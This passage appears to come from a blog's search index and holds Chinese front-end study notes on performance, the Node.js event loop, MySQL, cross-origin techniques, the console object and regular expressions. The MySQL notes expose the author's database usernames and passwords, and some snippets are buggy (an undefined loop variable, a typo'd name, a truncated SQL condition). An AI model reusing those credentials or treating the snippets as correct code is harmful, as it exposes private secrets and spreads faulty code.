      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[性能优化]]></title>
    <url>%2F2019%2F04%2F04%2Foptimization%2F</url>
    <content type="text"><![CDATA[前言 性能优化 关键渲染路径 处理 HTML 标记并构建 DOM 树。 处理 CSS 标记并构建 CSSOM 树。(CSS 被视为阻塞渲染的资源，这意味着浏览器将不会渲染任何已处理的内容，直至 CSSOM 构建完毕。) 将 DOM 与 CSSOM 合并成一个渲染树。 根据渲染树来布局。 将各个节点绘制到屏幕上。当DOM或者CSSOM发生变化的时候，浏览器就需要再次执行一次上面的步骤。 当HTML解析过程中遇到一个script标记时，它会暂停DOM构建，将控制权移交给JavaScript引擎，等JavaScript引擎运行完毕，浏览器再从中断的地方恢复DOM构建。也就是说，执行内联的JavaScript会阻塞页面的首次渲染。 对JS优化 引用JS方式async，完全的异步操作，HTML解析遇到该标签后，发出网络请求，但不阻止HTML解析和其后面的渲染操作，当JavaScript请求返回后立刻执行，且不等待HTML解析或其他操作的完成。所以，如果脚本中有DOM操作，就并不适合。defer，HTML的解析和对JavaScript资源的网络请求是并行的，但它会等待HTML解析完成之后，才执行脚本。 对CSS优化 尽早和按需的加载CSS 内联CSS来提高渲染性能 写样式尽量使用class和id，保证层级扁平，减少过度层叠 避免使用CSS表达式举个css表达式的例子 font-color: expression( (new Date()).getHours()%3 ? “#FFFFFF” : “#AAAAAA” );这个表达式会持续的在页面上计算样式，影响页面的性能。并且css表达式只被IE支持。 不同浏览器首屏渲染策略不同。chrome等CSS加载完再渲染，Firefox先生成HTML再附上CSS 减少HTTP请求 尽量少使用外链的JS和CSS文件以前CSS的@import 雪碧图，尽量合并图片、CSS、JS 渲染必备CSS内联到HTML中 缓存策略 删除重复的JS和CSS重复调用脚本，除了增加额外的HTTP请求外，多次运算也会浪费时间。在IE和Firefox中不管脚本是否可缓存，它们都存在重复运算JavaScript的问题。 可缓存的AJAX异步请求同样的造成用户等待，所以使用ajax请求时，要主动告诉浏览器如果该请求有缓存就去请求缓存内容。如下代码片段, cache:true就是显式的要求如果当前请求有缓存的话，直接使用缓存 123456$.ajax(&#123; url : &apos;url&apos;, dataType : &quot;json&quot;, cache: true, success : function(son, status)&#123; &#125; 减少Cookie的大小Cookie里面别塞那么多东西，因为每个请求都得带着他跑 使用无cookie的域比如CSS、js、图片等，客户端请求静态文件的时候，减少了 Cookie 的反复传输对主域名的影响。 减少资源的大小 压缩、去注释 JavaScript 和 CSS 使用gzip压缩内容gzip能够压缩任何一个文本类型的响应，包括html，xml，json。大大缩小请求返回的数据量。 延迟JavaScript非阻塞资源加载 删除未使用的代码 异步懒加载代码 懒加载屏幕外图片 预先加载关键请求 HTTP的传输层协议是TCP，TCP协议有一个慢启动的过程，即它在第一次传递数据时，只能同时传递14kb的数据块，所以当数据超多14kb时，TCP协议传递数据实际是多次的往返（roundtrip）。如果能够将渲染所需要的资源控制在14kb之内，那么就能TCP协议启动时，一次完成数据的传递。 CDN使用CDN网站上静态资源即css、js、图片全都使用cdn分发 图像JPG/JPEG优点JPG的压缩方式（有损压缩）是一种高质量的压缩方式：当我们把图片体积压缩至原有体积的 50% 以下时，JPG 仍然可以保持住 60% 的品质。此外，JPG 格式以 24 位存储单个图，可以呈现多达 1600 万种颜色，足以应对大多数场景下对色彩的要求 缺陷处理矢量图形和 Logo 等线条感较强、颜色对比强烈的图像时，人为压缩导致的图片模糊会明显不支持透明度处理 使用场景背景图、轮播图或 Banner 图 PNG优点PNG是一种无损压缩的高保真的图片格式。8 位的 PNG 最多支持 256 种颜色，而 24 位的可以呈现约 1600 万种颜色。PNG 图片具有比 JPG 更强的色彩表现力，对线条的处理更加细腻，对透明度有良好的支持。 缺点 体积太大。 使用场景小的 Logo、颜色简单且对比强烈的图片或背景 SVG优点SVG 指可伸缩矢量图形 ，属于对图像的形状描述，本质上是文本文件，体积较小，且不管放大多少倍都不会失真。 缺点绘制太复杂 使用场景LOGO 使用方法 直接插入网页，成为 DOM 的一部分 12345678&lt;svg id=&quot;mysvg&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 800 600&quot; preserveAspectRatio=&quot;xMidYMid meet&quot;&gt; &lt;circle id=&quot;mycircle&quot; cx=&quot;400&quot; cy=&quot;300&quot; r=&quot;50&quot; /&gt;&lt;svg&gt; 写在一个独立文件中，然后用、、、等标签插入网页 1234&lt;img src=&quot;circle.svg&quot;&gt;&lt;object id=&quot;object&quot; data=&quot;circle.svg&quot; type=&quot;image/svg+xml&quot;&gt;&lt;/object&gt;&lt;embed id=&quot;embed&quot; src=&quot;icon.svg&quot; type=&quot;image/svg+xml&quot;&gt;&lt;iframe id=&quot;iframe&quot; src=&quot;icon.svg&quot;&gt;&lt;/iframe&gt; 转为 BASE64 编码，然后作为 Data URI 写入网页。 1&lt;img src=&quot;data:image/svg+xml;base64,[data]&quot;&gt; 重要属性 123fill：填充色stroke：描边色stroke-width：边框宽度 WebP优点与 PNG 相比，WebP 无损图像的尺寸缩小了 26％。在等效的 SSIM 质量指数下，WebP 有损图像比同类 JPEG 图像小25-34％。 无损 WebP 支持透明度（也称为 alpha 通道），仅需 22％ 的额外字节。对于有损 RGB 压缩可接受的情况，有损 WebP 也支持透明度，与 PNG 相比，通常提供 3 倍的文件大小。WebP 是谷歌引入的一种相对较新的格式，它的目标是通过以无损和有损格式编码图像来提供更小的文件大小，使其成为 JPEG 和 PNG 的一个很好的替代方案。WebP 图像的清晰度通常可以与 JPEG 和 PNG相提并论，而且文件大小要小得多。 缺点浏览器支持度不够 使用方式一旦有了 WebP 图像，可以使用以下标记将它们提供给可以使用它们的浏览器，同时向不兼容 WebP 的浏览器使用 png 或者 jpeg。 12345&lt;picture&gt; &lt;source srcset=&quot;sample_image.webp&quot; type=&quot;image/webp&quot;&gt; &lt;source srcset=&quot;sample_image.jpg&quot; type=&quot;image/jpg&quot;&gt; &lt;img src=&quot;sample_image.jpg&quot; alt=&quot;&quot;&gt;&lt;/picture&gt; 理解 image/webp 媒体类型的浏览器将下载 Webp 图片并显示它，而其他浏览器将下载 JPEG 图片。任何不支持 的浏览器都将跳过所有 source 标签，并加载底部 img 标签。因此，我们通过提供对所有浏览器类的支持，逐步增强了我们的页面。*可以根据不同的条件加载不同的图像，这些条件可以是视窗当前的高度（viewport），宽度（width），方向（orientation），像素密度（dpr） 网络字体在网络加载比较慢的情况下，用户可能会感受到字体或者图形的变化（Icon Font）。其实，浏览器在渲染树构建完成之后，会指示需要哪些字体在网页上渲染指定文本，然后分派字体请求，浏览器执行布局并将内容绘制到屏幕上，如果字体尚不可用，浏览器可能不会渲染任何文本像素，待字体可用之后，再绘制文本像素，当然，不同浏览器之间实际行为有所差异 123@font-face&#123; font-display:wrap;&#125; Font display 可帮助你根据交换所需的时间来决定网络字体的渲染或退阶方式。 其他 避免空的src和href当link标签的href属性为空、script标签的src属性为空的时候，浏览器渲染的时候会把当前页面的URL作为它们的属性值，从而把页面的内容加载进来作为它们的值。 避免跳转有种现象会比较坑爹，看起来没什么差别，其实多次了一次页面跳转。比如当URL本该有斜杠（/）却被忽略掉时。例如，当我们要访问 http://baidu.com 时，实际上返回的是一个包含301代码的跳转，它指向的是 http://baidu.com/（注意末尾的斜杠）。在nginx服务器可以使用rewrite；Apache服务器中可以使用Alias 或者 mod_rewrite或者the DirectorySlash来避免。另一种是不用域名之间的跳转， 比如访问 http://baidu.com/bbs 跳转到http://bbs.baidu.com/。那么可以通过使用Alias或者mod_rewirte建立CNAME（保存一个域名和另外一个域名之间关系的DNS记录）来替代。 减少DOM元素数量就会减少浏览器的解析负担 避免404比如外链的css或者js文件出现问题返回404时，会破坏浏览器对文件的并行加载。并且浏览器会把试图在返回的404响应内容中找到可能有用的部分当作JavaScript代码来执行。 不要使用滤镜IE独有属性AlphaImageLoader用于修正7.0以下版本中显示PNG图片的半透明效果。这个滤镜的问题在于浏览器加载图片时它会终止内容的呈现并且冻结浏览器。在每一个元素（不仅仅是图片）它都会运算一次，增加了内存开支，因此它的问题是多方面的。完全避免使用AlphaImageLoader的最好方法就是使用PNG8格式来代替，这种格式能在IE中很好地工作。如果你确实需要使用AlphaImageLoader，请使用下划线_filter又使之对IE7以上版本的用户无效。 参考资料https://zhuanlan.zhihu.com/p/58419577http://www.ruanyifeng.com/blog/2018/08/svg.htmlhttps://zhuanlan.zhihu.com/p/38548289《高性能网站建设指南（第二版》]]></content>
      <categories>
        <category>FrontEnd</category>
      </categories>
      <tags>
        <tag>前端开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node.js]]></title>
    <url>%2F2019%2F02%2F23%2FNodejs%2F</url>
    <content type="text"><![CDATA[前言 Node 中的 Event Loop 和浏览器中的是完全不相同的东西。Node.js 采用 V8 作为 js 的解析引擎，而 I/O 处理方面使用了自己设计的 libuv，libuv 是一个基于事件驱动的跨平台抽象层，封装了不同操作系统一些底层特性，对外提供统一的 API，事件循环机制也是它里面的实现 轮询机制通过libuv库实现 uv_run函数分为六个阶段 timers 定时器阶段计时和执行到点的定时器回调函数 pending callbacks某些系统操作（如TCP错误类型）的回调函数 idle.prepare准备工作 poll 轮询阶段如果轮询队列不为空，依次同步取出轮询队列中第一个回调函数执行，直到轮询队列为空或达到系统最大限制；如果轮询队列为空：如果有setImmediate，直接进入下个check阶段； 如果没有就在poll阶段等待，直到轮询队列添加了新的回调函数或者定时器到点就去下个check阶段； check执行setImmediate设置的回调函数 close/callbacks 关闭阶段执行close事件回调函数 process.nextTick这个函数其实是独立于 Event Loop 之外的，它有一个自己的队列，当每个阶段完成后，如果存在 nextTick 队列，就会清空队列中的所有回调函数，并且优先于其他 microtask 执行。 外部输入数据–&gt;轮询阶段(poll)–&gt;检查阶段(check)–&gt;关闭事件回调阶段(close callback)–&gt;定时器检测阶段(timer)–&gt;I/O 事件回调阶段(I/O callbacks)–&gt;闲置阶段(idle, prepare) timers 阶段：这个阶段执行 timer（setTimeout、setInterval）的回调 I/O callbacks 阶段：处理一些上一轮循环中的少数未执行的 I/O 回调 idle, prepare 阶段：仅 node 内部使用 poll 阶段：获取新的 I/O 事件, 适当的条件下 node 将阻塞在这里 check 阶段：执行 setImmediate() 的回调 close callbacks 阶段：执行 socket 的 close 事件回调 日常开发中的绝大部分异步任务都是在timers、poll、check`这 3 个阶段处理的。 (1) timer timers 阶段会执行 setTimeout 和 setInterval 回调，并且是由 poll 阶段控制的。同样，在 Node 中定时器指定的时间也不是准确时间，只能是尽快执行。 (2) poll poll 是一个至关重要的阶段，这一阶段中，系统会做两件事情 回到 timer 阶段执行回调 执行 I/O 回调 并且在进入该阶段时如果没有设定了 timer 的话，会发生以下两件事情 如果 poll 队列不为空，会遍历回调队列并同步执行，直到队列为空或者达到系统限制 如果 poll 队列为空时，会有两件事发生 如果有 setImmediate 回调需要执行，poll 阶段会停止并且进入到 check 阶段执行回调 如果没有 setImmediate 回调需要执行，会等待回调被加入到队列中并立即执行回调，这里同样会有个超时时间设置防止一直等待下去 当然设定了 timer 的话且 poll 队列为空，则会判断是否有 timer 超时，如果有的话会回到 timer 阶段执行回调。 (3) check 阶段 setImmediate()的回调会被加入 check 队列中，从 event loop 的阶段图可以知道，check 阶段的执行顺序在 poll 阶段之后。 注意 setImmediate 设计在 poll 阶段完成时执行，即 check 阶段； setTimeout 设计在 poll 阶段为空闲时，且设定时间到达后执行，但它在 timer 阶段执行 简单实现Node的Events模块参考回答：简介：观察者模式或者说订阅模式，它定义了对象间的一种一对多的关系，让多个观察者对象同时监听某一个主题对象，当一个对象发生改变时，所有依赖于它的对象都将得到通知。 node中的Events模块就是通过观察者模式来实现的： 123456var events=require(&apos;events&apos;);var eventEmitter=new events.EventEmitter();eventEmitter.on(&apos;say&apos;,function(name)&#123;console.log(&apos;Hello&apos;,name);&#125;)eventEmitter.emit(&apos;say&apos;,&apos;Jony yu&apos;); 这样，eventEmitter发出say事件，通过On接收，并且输出结果，这就是一个订阅模式的实现，下面我们来简单的实现一个Events模块的EventEmitter。 (1)实现简单的Event模块的emit和on方法 12345678910111213141516171819function Events()&#123;this.on=function(eventName,callBack)&#123;if(!this.handles)&#123;this.handles=&#123;&#125;;&#125;if(!this.handles[eventName])&#123;this.handles[eventName]=[];&#125;this.handles[eventName].push(callBack);&#125;this.emit=function(eventName,obj)&#123;if(this.handles[eventName])&#123;for(var i=0;o&lt;this.handles[eventName].length;i++)&#123;this.handles[eventName][i](obj);&#125;&#125;&#125;return this;&#125; 这样我们就定义了Events，现在我们可以开始来调用： 12345var events=new Events();events.on(&apos;say&apos;,function(name)&#123;console.log(&apos;Hello&apos;,nama)&#125;);events.emit(&apos;say&apos;,&apos;Jony yu&apos;); //结果就是通过emit调用之后，输出了Jony yu (2)每个对象是独立的 因为是通过new的方式，每次生成的对象都是不相同的，因此： 12345678910var event1=new Events();var event2=new Events();event1.on(&apos;say&apos;,function()&#123;console.log(&apos;Jony event1&apos;);&#125;);event2.on(&apos;say&apos;,function()&#123;console.log(&apos;Jony event2&apos;);&#125;)event1.emit(&apos;say&apos;);event2.emit(&apos;say&apos;); //event1、event2之间的事件监听互相不影响 //输出结果为’Jony event1’ ‘Jony event2’ https://zhuanlan.zhihu.com/p/54882306]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL操作一览]]></title>
    <url>%2F2019%2F02%2F23%2FMySQL%2F</url>
    <content type="text"><![CDATA[前言 MySQL操作一览 BY wid一、概念 SQL即为Structured Query Language(结构化查询语言) MySQL 为关系型数据库(Relational Database Management System), 这种所谓的”关系型”可以理解为”表格”的概念, 一个关系型数据库由一个或数个表格组成, 如图所示的一个表格: 表头(header): 每一列的名称; 列(column): 具有相同数据类型的数据的集合; 行(row): 每一行用来描述某个人/物的具体信息; 值(value): 行的具体信息,每个值必须与该列的数据类型相同; 键(key): 表中用来识别某个特定的人\物的方法,键的值在当前列中具有唯一性。一、安装信息配置的端口：3306 用户：Root:539450;CatcherInSky:zxc123 Windows Service Name: MySQL57 服务：控制面板-&gt;系统与安全-&gt;管理工具-&gt;服务 可停用、重启与卸载MySQL服务 路径：C:\Program Files\MySQL\MySQL Server 5.7\bin 二、基础操作1.用户行为 2.1.1.登录cmd进入安装路径，输入 mysql -D 数据库名 -h 主机名 -u 用户名 -p； 2.库的操作 2.2.1创建数据库 create database 数据库名 其它选项； 2.2.2查看数据库 show databases； 2.2.3登录数据库 use 数据库名（库声明）; 声明如： character set gbk 可将数据库字符编码指定为 gbk 2.2.4删除数据库 drop database 数据库名; .表的操作 2.3.1创建数据库表 create table 表名称(列声明); 对于一些较长的语句在命令提示符下可能容易输错,因此我们可以通过任何文本编辑器将语句输入好后保存为 createtable.sql 的文件中, 通过命令提示符下的文件重定向执行执行该脚本。 mysql -D samp_db -u root -p &lt; createtable.sql； (提示: 1.如果连接远程主机请加上 -h 指令; 2. 该文件若不在当前工作目录下需指定文件的完整路径。) 列声明首项为列的名称后面为数据类型描述。 2.3.2查看数据库表 查看所有表名称 show tables; 查看某个表的详细信息 describe 表名; 2.3.4删除数据库表 drop table 表名; 2.3.5重命名数据库表 alter table 表名 rename 新表名; 2.3.6修改数据库表alter table 语句用于创建后对表的修改, 基础用法如下: 2.3.6.1添加列 alter table 表名 add 列名 列数据类型 [after 插入位置]; 示例:在表的最后追加列 address: alter table students add address char(60); 示例：在名为 age 的列后插入列 birthday: alter table students add birthday date after age; 2.3.6.2修改列 alter table 表名 change 列名称 列新名称 新数据类型; 示例：将表 tel 列改名为 telphone alter table students change tel telphone char(13) default “-“; 示例：将 name 列的数据类型改为 char(16) alter table students change name name char(16) not null; 2.3.6.3删除列 alter table 表名 drop 列名称; 示例:删除 birthday 列: alter table students drop birthday; 4.值的操作 2.4.1插入数据 insert [into] 表名 [(列名1, 列名2, …)] values (值1, 值2, …); 从第一列数据开始写全部数据 insert into students values(NULL, “王刚”, “男”, 20,”13811371377”); 从某列开始写部分数据 insert into students (name, sex, age) values(“孙丽华”, “女”, 21); 2.4.2查询表中的数据 select 列名称 from 表名称 where 特定条件; 也可以使用通配符 * 查询表中所有的内容。where 子句不仅仅支持 “where 列名 = 值” 这种名等于值的查询形式,对一般的比较运算的运算符都是支持的, 例如 =、&gt;、&lt;、&gt;=、&lt;、!=以及一些扩展运算符 is [not] null、in、like 等等。 还可以对查询条件使用 or 和 and 进行组合查询 示例:查询年龄在21岁以上的所有人信息: select * from students where age &gt; 21; 示例:查询名字中带有 “王” 字的所有人信息: select * from students where name like “%王%”; 示例:查询id小于5且年龄大于20的所有人信息: select * from students where id20; 2.4.3更新表中的数据 update 表名称 set 列名称=新值 更新条件; 2.4.4删除表中数据 delete from 表名称 where 删除条件; 不加条件删除所有数据]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>DataBase</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨域]]></title>
    <url>%2F2018%2F12%2F24%2FcrossOrigin%2F</url>
    <content type="text"><![CDATA[前言简单记录Git用法以做记录 什么是跨域同源策略同源指 协议 域名 端口 相同为同源，即便两个不同的域名指向同一个 ip 地址，也非同源。浏览器的同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到 XSS、CSFR 等攻击。 触发跨域错误浏览器端的限制（服务端收到了请求并正确返回）发送的是 XMLHttpRequest 请求（使用 img 标签发送的请求为 json 类型，并不会报错）请求了不同域的资源 CSRF服务端验证通过后会在响应头加入Set-Cookie字段，然后下次再发请求的时候，浏览器会自动将cookie附加在HTTP请求的头字段Cookie中。如果没有同源策略的限制，盗用cookie进行请求进行CSRF攻击。 方法JSONPJSONP，是 JSON with Padding 的简称，它是 json 的一种补充使用方式，利用 script 标签来解决跨域问题。JSONP 是非官方协议，他只是前后端一个约定，如果请求参数带有约定的参数，则后台返回 javascript 代码而非 json 数据，返回代码是函数调用形式，函数名即约定值，函数参数即要返回的数据。 首先在客户端 js 中定义一个函数（假设名为 handler），然后动态创建一个 script 标签插入页面中，script 标签的 src 属性即要调用的地址，同时，在调用的 url 中加入一个服务端约定的参数（假设名为 callback，参数值为已定义的函数名 handler），服务端收到请求，如果发现请求的 url 中带有约定的参数，那么就返回一段函数调用形式的 javascript 代码，该段代码的函数名即为 callback 参数的值 handler，函数的参数即为待返回的数据。这样，客户端拿到返回结果后就会执行 handler 函数，对返回的数据进行处理。 存在以下缺陷：1.只能发送 GET 请求2.发送的不是 XHR 请求，这样导致 XHR 请求中的很多事件都无法进行处理3.服务端需要改动 ## 1234567891011function jsonp(url, callback, success) &#123; var script = document.createElement(&apos;script&apos;); script.src = url; script.async = true; script.type = &apos;text/javascript&apos;; window[callback] = function(data) &#123; success &amp;&amp; success(data); &#125; document.body.appendChild(script);&#125; ### 空iframe加formJSONP只能发GET请求，因为本质上script加载资源就是GET，用这个方法发POST请求 后端写个小接口 12345678910// 处理成功失败返回格式的工具const &#123;successBody&#125; = require(&apos;../utli&apos;)class CrossDomain &#123; static async iframePost (ctx) &#123; let postData = ctx.request.body console.log(postData) ctx.body = successBody(&#123;postData: postData&#125;, &apos;success&apos;) &#125;&#125;module.exports = CrossDomain 前端 12345678910111213141516171819202122232425262728293031323334353637const requestPost = (&#123;url, data&#125;) =&gt; &#123; // 首先创建一个用来发送数据的iframe. const iframe = document.createElement(&apos;iframe&apos;) iframe.name = &apos;iframePost&apos; iframe.style.display = &apos;none&apos; document.body.appendChild(iframe) const form = document.createElement(&apos;form&apos;) const node = document.createElement(&apos;input&apos;) // 注册iframe的load事件处理程序,如果你需要在响应返回时执行一些操作的话. iframe.addEventListener(&apos;load&apos;, function () &#123; console.log(&apos;post success&apos;) &#125;) form.action = url // 在指定的iframe中执行form form.target = iframe.name form.method = &apos;post&apos; for (let name in data) &#123; node.name = name node.value = data[name].toString() form.appendChild(node.cloneNode()) &#125; // 表单元素需要添加到主文档中. form.style.display = &apos;none&apos; document.body.appendChild(form) form.submit() // 表单提交后,就可以删除这个表单,不影响下次的数据发送. document.body.removeChild(form)&#125;// 使用方式requestPost(&#123; url: &apos;http://localhost:9871/api/iframePost&apos;, data: &#123; msg: &apos;helloIframePost&apos; &#125;&#125;) postMessage 跨域postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。 123456789101112131415161718192021//捕获iframevar domain = "http://scriptandstyle.com";var iframe = document.getElementById("myIFrame").contentWindow;//发送消息setInterval(function() &#123; var message = "Hello! The time is: " + new Date().getTime(); console.log("blog.local: sending message: " + message); //send the message and target URI iframe.postMessage(message, domain);&#125;, 6000);//响应事件window.addEventListener( "message", function(event) &#123; if (event.origin !== "http://davidwalsh.name") return; console.log("message received: " + event.data, event); event.source.postMessage("holla back youngin!", event.origin); &#125;, false); postMessage跨域适用于以下场景：同浏览器多窗口间跨域通信、iframe间跨域通信。 CORS”跨域资源共享”（Cross-origin resource sharing）需要浏览器和后端同时支持服务端设置 Access-Control-Allow-Origin 该属性表示哪些域名可以访问资源，如果设置通配符则表示所有网站都可以访问资源。 Access-Control-Allow-Origin简单说，允许跨域访问的host，必须设置，否则不允许跨域。 // 如需允许所有资源都可以访问您的资源，您可以如此设置：Access-Control-Allow-Origin: * // 如需允许https://developer.mozilla.org访问您的资源，您可以设置：Access-Control-Allow-Origin: https://developer.mozilla.orgAccess-Control-Allow-Credentials如果想跨域传输cookies,需要Access-Control-Allow-Credentials与XMLHttpRequest.withCredentials 或Fetch API中的Request() 构造器中的credentials 选项结合使用。Credentials必须在前后端都被配置（即the Access-Control-Allow-Credentials header 和 XHR 或Fetch request中都要配置）才能使带credentials的CORS请求成功。 Access-Control-Request-Method允许跨域的请求的方法。 Access-Control-Allow-Methods: POST, GET, OPTIONSAccess-Control-Allow-Headersresponse的header中Access-Control-Allow-Headers 用于 preflight request （即会在实际请求发送之前先发送一个option请求）中，列出了将会在正式请求的 Access-Control-Expose-Headers 字段中出现的首部信息。 简单首部，如 simple headers、Accept、Accept-Language、Content-Language、Content-Type （只限于解析后的值为 application/x-www-form-urlencoded、multipart/form-data 或 text/plain 三种MIME类型（不包括参数）），它们始终是被支持的，不需要在这个首部特意列出。 preflight request–options请求很多人在抓包时会很郁闷怎么会无端端多出了一个OPTIONS请求，请不要奇怪，这只是CORS策略的预检请求，就像你要去跟别人借个东西，要先问问对方肯不肯一样。 什么情况下会发送OPTIONS请求？简单的说，就是有自定义headers，Content-Type的值不属于下列之一:application/x-www-form-urlencoded，multipart/form-data，text/plain的请求会触发OPTIONS请求。如果产生OPTIONS请求，需要后台去响应它，允许它跨域。 简单请求：只要同时满足以下两大条件，就属于简单请求条件 1：使用下列方法之一： GET HEAD POST 条件 2：Content-Type 的值仅限于下列三者之一： text/plain multipart/form-data application/x-www-form-urlencoded document.domain 的值可以设置为其当前域或其当前域的父域，来允许子域安全访问其父域时，您需要在父域和子域中设置 document.domain 为相同的值。 Nginx代理 https://segmentfault.com/a/1190000015597029 https://zhuanlan.zhihu.com/p/53545472 https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy https://zhuanlan.zhihu.com/p/67489101 https://zhuanlan.zhihu.com/p/57991633]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript Console 对象]]></title>
    <url>%2F2018%2F11%2F24%2Fconsole%2F</url>
    <content type="text"><![CDATA[前言 Console 对象用于 JavaScript 调试。JavaScript 原生中默认是没有 Console 对象,这是宿主对象（也就是游览器）提供的内置对象。 用于访问调试控制台, 在不同的浏览器里效果可能不同。 Console 对象常见的两个用途： 显示网页代码运行时的错误信息。 提供了一个命令行接口，用来与网页代码互动。 Chrome和大部分浏览器都可以通过F12调出这个窗口 在console面板输入 for(var i in console){console.log(i)} 可列出所有Console方法 log()console上述的集中度支持printf的占位符格式，支持的占位符有：字符（%s）、整数（%d或%i）、浮点数（%f）和对象（%o）: 占位符 作用 %s 字符串 %d or %i 整数 %f 浮点数 %o 可展开的DOM %O 列出DOM的属性 %c 根据提供的css样式格式化字符串 在console.log里使用CSS： info() warn() error() assert()assert方法接受两个参数，第一个参数是表达式，第二个参数是字符串。只有当第一个参数为false，才会输出第二个参数，否则不会有任何结果。 clear()清除当前控制台的所有输出，将光标回置到第一行。 count()用于计数，输出它被调用了多少次。 group() /groupCollapsed()/ groupEnd()用于将显示的信息分组，可以把信息进行折叠和展开。 与console.group方法很类似，唯一的区别是该组的内容，在第一次显示时是收起的（collapsed），而不是展开的。 table()将复合类型的数据转为表格显示 time()计时 trace()追踪函数的调用过程 dirxml()用来显示网页的某个节点（node）所包含的html/xml代码。 profile() 性能分析（Profiler）就是分析程序各个部分的运行时间，找出瓶颈所在。 123456789101112131415function All() &#123; for (var i = 0; i &lt; 10; i++) &#123; funcA(1000); &#125; funcB(10000); &#125;function funcA(count) &#123; for (var i = 0; i &lt; count; i++) &#123;&#125; &#125;function funcB(count) &#123; for (var i = 0; i &lt; count; i++) &#123;&#125; &#125;console.profile(&apos;性能分析器&apos;);All(); console.profileEnd(); dir()console.dir()方法用来对一个对象进行检查，并以易于阅读和打印的格式显示。类似于log()，但可以显示一个对象所有的属性和方法。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RegExp正则表达式]]></title>
    <url>%2F2018%2F07%2F13%2Fregexp%2F</url>
    <content type="text"><![CDATA[前言 正则表达式 定义正则表达式，又称规则表达式。（英语：Regular Expression，在代码中常简写为regex、RegExp或RE），计算机科学的一个概念。在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要。正则表达式就是用于描述这些规则的工具。换句话说，正则表达式就是记录文本规则的代码。正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。 正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。 测试Javascript正则表达式在线测试工具[https://www.regexpal.com/][https://regexr.com/] 作用：在字符串操作中常用于： 验证（给定的字符串是否符合正则表达式的过滤逻辑） 验证输入是否符合规范 查找（可以通过正则表达式，从字符串中获取我们想要的特定部分） 查找所需字符段落 替换成自己想要的内容 还有一些特殊的操作 在HTML中可以这样使用 12345&lt;style&gt;input:invalid &#123; border-color: red; &#125; input, input:valid &#123; border-color: #ccc; &#125;&lt;/style&gt;&lt;input type=&quot;text&quot; name=&quot;tel&quot; placeholder=&quot;tel&quot; pattern=&quot;\d&#123;11&#125;&quot;&gt; 声明123var expression = / pattern / flags;var expression = new RegExp(&quot; patterns &quot; , &quot; flags &quot;);//patterns为pattern中每个元字符前加一个\组成或者由字符串加变量组成 expression：正则表达式的名称 pattern：正则表达式的模式 flags：标志，包括 g:global,应用于所有字符串，而非在发现第一个匹配项时立即停止 i:case-insesitive,忽略大小写 m:multiline,多行检测 u:Unicode,用来正确处理大于\uFFFFd Unicode字符注意：点（.）字符在正则表达式中，含义是除了换行符以外的任意单个字符。对于码位大于0xFFFF的 Unicode 字符，点字符不能识别，必须加上u修饰符 y:sticky,y修饰符的作用与g修饰符类似，也是全局匹配，后一次匹配都从上一次匹配成功的下一个位置开始。不同之处在于，g修饰符只要剩余位置中存在匹配就可，而y修饰符确保匹配必须从剩余的第一个位置开始，这也就是“粘连”的涵义。 实例属性 属性 数据类型 意义 global boolean 是否有g标志 ignoreCase boolean 是否有i标志 multiline boolean 是否有m标志 lastIndex int 从第几个字符开始匹配 source str 正则表达式的字符串表示 flags str 正则表达式的修饰符 sticky boolean 是否有y标签 RegExp实例方法regObj.test(strObj)用于测试字符串中是否存在符合正则表达式模式的部分，如果存在则返回true，否则返回false。123456789var test = function()&#123; var PhoneNumber = /^\d&#123;11&#125;$/; var number1 = &quot;17802015408&quot;; var number2 = &quot;1530775669&quot;; var number3 = &quot;178020154080&quot;; console.log(&quot;number1 is a &quot; + PhoneNumber.test(number1) + &quot; phone number.&quot;); console.log(&quot;number2 is a &quot; + PhoneNumber.test(number2) + &quot; phone number.&quot;); console.log(&quot;number3 is a &quot; + PhoneNumber.test(number3) + &quot; phone number.&quot;);&#125;() regObj.exec(strObj)方法用于正则表达式模式在字符串中运行查找，如果 exec() 找到了匹配的文本，则返回一个结果数组。否则，返回 null。除了数组元素和 length 属性之外，exec() 方法还返回两个属性。index 属性声明的是匹配文本的第一个字符的位置。input 属性则存放的是被检索的字符串 string。 调用非全局的 RegExp对象的 exec() 时，返回数组的第 0 个元素是与正则表达式相匹配的文本，第 1 个元素是与 RegExpObject 的第 1 个分组相匹配的文本（如果有的话），第 2 个元素是与 RegExp对象的第 2 个分组相匹配的文本（如果有的话），以此类推。 调用全局的RegExp对象的 exec() 时，它会在 RegExp实例的 lastIndex 属性指定的字符处开始检索字符串 string。当 exec() 找到了与表达式相匹配的文本时，在匹配后，它将把 RegExp实例的 lastIndex 属性设置为匹配文本的最后一个字符的下一个位置。可以通过反复调用 exec() 方法来遍历字符串中的所有匹配文本。当 exec() 再也找不到匹配的文本时，它将返回 null，并把 lastIndex 属性重置为 0。1234567891011121314151617181920212223242526272829//无g标志var execs = function()&#123; var text = &quot;abababab&quot;; var pattern = /ab(ab)/; console.log(pattern.exec(text)); console.log(pattern.lastIndex); console.log(pattern.exec(text)); console.log(pattern.lastIndex); console.log(pattern.exec(text)); console.log(pattern.lastIndex);&#125;()//有g标志var execg = function()&#123; var text = &quot;AbAbBCAb&quot;; var pattern = 